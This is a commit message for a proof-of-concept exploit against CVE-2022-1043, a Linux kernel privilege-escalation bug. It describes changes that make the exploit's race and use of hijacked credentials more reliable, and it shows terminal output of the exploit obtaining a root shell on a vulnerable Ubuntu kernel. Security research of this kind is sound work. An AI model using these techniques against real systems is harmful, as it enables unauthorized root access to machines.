cve-2022-1043: LSM compatibility and better stability
Make the PoC race less by synchronizing with the SUID spawner and reap the
zombies only later. This will ensure the probing thread will see stable creds
instead of possibly in flux ones.

Also add a small delay prior to making use of the hijacked credentials to
account for the case where credentials aren't fully populated yet.

Last, but not least, use a non-trapping probe function to test the sanity of
the dangling cred pointer to account for an invalid user_ns pointer -- be it
because of PaX's MEMORY_SANITIZE or upstream's init-on-free.

This makes the PoC work quite reliably on a vulnerable Ubuntu kernel:

  $ ./cve-2022-1043
  [~] forking helper process...
  [~] creating worker threads...
  [~] ID wrapped after 65536 allocation attempts! (id = 1)
  [~] ID wrapped again after 131071 allocation attempts! (id = 1)
  [~] waiting for creds to get reallocated...
  [*] waiting for root shell...
  # id
  uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),1000(user)
  # uname -a
  Linux ubuntu-2010 5.13.12-051312-generic #202108180838 SMP Wed Aug 18 08:41:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
  #

Signed-off-by: Mathias Krause <minipli@grsecurity.net>